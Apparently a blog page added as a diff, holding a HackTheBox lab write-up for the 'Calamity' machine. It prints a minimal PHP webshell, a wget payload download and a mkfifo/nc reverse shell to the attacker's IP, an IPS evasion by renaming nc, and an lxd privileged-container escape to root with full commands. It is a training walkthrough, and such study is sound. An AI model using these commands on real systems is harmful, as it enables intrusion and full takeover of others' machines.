@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 7 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 7</h1>
+          <p class="post-date">Posted <time datetime="2019-06-09">Jun 9, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="calamity">Calamity</h1>
+
+<p>It just seems in Medium difficulty, however, it is really brainfuck in privilege escalation part.</p>
+
+<h2 id="before-start">Before start</h2>
+
+<p>Nmap Scan: 80 and 22, Apache + SSH.</p>
+
+<p>Gobuster Scan: /uploads(200), admin.php(200)</p>
+
+<h1 id="normal-user">Normal User</h1>
+
+<h2 id="reverse-shell">Reverse shell</h2>
+
+<p>Access <code>admin.php</code> and you will find the <code>admin</code> with password in the comment of the webpage source code, which is: <code>password is:skoupidotenekes</code></p>
+
+<p>After you login, you&rsquo;ve been told that this page could execute and php code. The question is that this method is submitted via URL params, so you can&rsquo;t submit too long code.</p>
+
+<p>The shortest php webshell is:</p>
+
+<pre><code class="language-php">&lt;?=`$_GET[1]`?&gt;
+</code></pre>
+
+<p>Just fired up my AntSword, generate a shell, and then detect if there&rsquo;s <code>wget</code>. It works. So write a php command to let it download the shell from the http server,
+Note: The <code>/var/www/html</code> is RO-only, you can only upload to <code>uploads/</code></p>
+
+<pre><code class="language-php">&lt;?php system(&quot;wget http://10.10.16.37:8080/te26st.php -o uploads/te26st.php&quot;);?&gt;
+</code></pre>
+
+<p>After that, try <code>nc</code> to get a reverse shell. But after connection established, it get killed immediately. So what should we do? Check the <code>/etc/passwd</code> and found a normal user called <code>xalvas</code>, try to access to the home, succeeded. Then we got <code>user.txt</code>. However, there&rsquo;s a <code>intrusions</code> folder here. Check the content, just logged that there&rsquo;s a crappy IPS which blacklisted some process to run.</p>
+
+<p>So let&rsquo;s just copy a <code>nc</code> to <code>/dev/shm</code> to avoid being killed:</p>
+
+<pre><code class="language-bash">$ cp /bin/nc /dev/shm/gibs
+$ chmod 755 /dev/shm/gibs
+</code></pre>
+
+<p>Then grab a php reverse shell from pentestmonkey, run it with our &ldquo;customized&rdquo; nc.</p>
+
+<pre><code class="language-php">&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/dev/shm/gibs 10.10.16.37 12334 &gt;/tmp/f&quot;);?&gt;
+</code></pre>
+
+<p>Successfully got the shell we need.</p>
+
+<h2 id="interactive-shell">Interactive shell</h2>
+
+<p>Download the <code>recov.wav</code> and <code>alarmclocks/rick.wav</code>. Import both of them into <code>audacity</code>, and invert one of them. You will hear the normal user password. Don&rsquo;t forget to set repeatedly play the audio.</p>
+
+<p>The password is: <code>18547936..*</code></p>
+
+<p>Just access it via SSH.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Of course, LinEnum first.</p>
+
+<p>Due to the normal user belongs to group lxd, and also the lxc is initialized before.</p>
+
+<p>And there&rsquo;s an ELF with <code>setuid</code> permission in <code>~/app</code>.</p>
+
+<p>So we have two methods to escalate.</p>
+
+<h2 id="lxc-method">LXC method</h2>
+
+<p>This is the easier one.</p>
+
+<p>We notice xalvas is member of the lxd group. Like with most container technologies (e.g.,), you can run processes with root privileges via LXD. Thus, being member of groups like lxd are more or less equivalent to being root. <a href="https://reboare.github.io/lxd/lxd-escape.html">Here</a> is a blog post with some details on how to exploit this group membership.</p>
+
+<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside. Running containers requires an image on the machine. Since we do not have an internet connection on the machine, we have to copy over an image. The outline is as follows:</p>
+
+<p>= Build an image locally and copy image to remote host
+= Import image into LXD, create a container and mount host filesystem
+= Run a shell inside the container and get flag</p>
+
+<h3 id="prepare-image">Prepare image</h3>
+
+<p>Alpine is a popular Linux distribution to base container images on since it is so small. Unlike other operating systems, which may result in a few hundred megs, Alpine images are often rather small. In this <a href="https://github.com/saghul/lxd-alpine-builder">repository</a> you can find a simple script to build a container. Clone it, cd into it, then run <code>./build-alpine -a i686</code> and a tar file <code>alpine-v3.7-i686-20180121_1729.tar.gz</code> will appear.</p>
+
+<p>With SSH access, copying is as easy as running <code>scp alpine-v3.7-i686-20180121_1729.tar.gz xalvas@10.10.10.27:/dev/shm/.tmp/alpine.tar.gz</code> .</p>
+
+<h3 id="prepare-container">Prepare container</h3>
+
+<p>Importing tar files as images is explained here. The steps are as follows:</p>
+
+<pre><code class="language-bash">xalvas@calamity:/dev/shm/.tmp$ lxc image import ./alpine.tar.gz --alias myimage
+Generating a client certificate. This may take a minute...
+If this is your first time using LXD, you should also run: sudo lxd init
+To start your first container, try: lxc launch ubuntu:16.04
+
+Image imported with fingerprint: facaf59235080f8c950f700f1c0a9e65a7487901dfc30d04bd78bba7444df4b0
+xalvas@calamity:/dev/shm/.tmp$ lxc image list
++---------+--------------+--------+------------------------------+------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |         DESCRIPTION          | ARCH |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+------------------------------+------+--------+------------------------------+
+| myimage | facaf5923508 | no     | alpine v3.7 (20180121_17:29) | i686 | 2.37MB | Jan 21, 2018 at 8:06pm (UTC) |
++---------+--------------+--------+------------------------------+------+--------+------------------------------+
+</code></pre>
+
+<p>The output above asks us to run lxd init but if we try, it tells us we should sudo, which we can’t do. Fortunately, it will work without, so it’s ok to ignore.</p>
+
+<p>We proceed by creating the container. The important part about it is using the flag security.privileged=true, which causes the container to interact as root with the host filesystem. This means all we have to do it mount the whole filesystem into the container and we get access to everything.</p>
+
+<pre><code class="language-bash">xalvas@calamity:/dev/shm/.tmp$ lxc init myimage mycontainer -c security.privileged=true
+Creating mycontainer
+xalvas@calamity:/dev/shm/.tml$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+xalvas@calamity:/dev/shm/.tmp$ lxc list
++-------------+---------+------+------+------------+-----------+
+|    NAME     |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
++-------------+---------+------+------+------------+-----------+
+| mycontainer | STOPPED |      |      | PERSISTENT | 0         |
++-------------+---------+------+------+------------+-----------+
+</code></pre>
+
+<h3 id="run-shell">Run shell</h3>
+
+<p>The last part is starting the container and executing a shell inside. We can then change into the rooted host filesystem and cat out the flag.</p>
+
+<pre><code class="language-bash">xalvas@calamity:/dev/shm/.tmp$ lxc start mycontainer
+xalvas@calamity:/dev/shm/.tmp$ lxc exec mycontainer /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # ls -la /mnt/root/
+total 108
+drwxr-xr-x   22 root     root          4096 Jun 29  2017 .
+drwxr-xr-x    3 root     root          4096 Jan 23 20:20 ..
+drwxr-xr-x    2 root     root          4096 Jun 28  2017 bin
+drwxr-xr-x    3 root     root          4096 Jun 27  2017 boot
+drwxr-xr-x   18 root     root          3880 Jan 21 22:26 dev
+drwxr-xr-x   96 root     root          4096 Jun 28  2017 etc
+[...]
+~ # cat /mnt/root/root/root.txt
+9be6... &lt;- flag
+</code></pre>
+
+<h2 id="buffer-overflow">Buffer Overflow</h2>
+
+<p><strong>This is really the most difficult one I faced here.</strong></p>
+
+<p>TBD</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup6/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 6</h2>
+    <p class="card-text">HackTheBox 练手</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-06-08 68:00">Jun 8, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
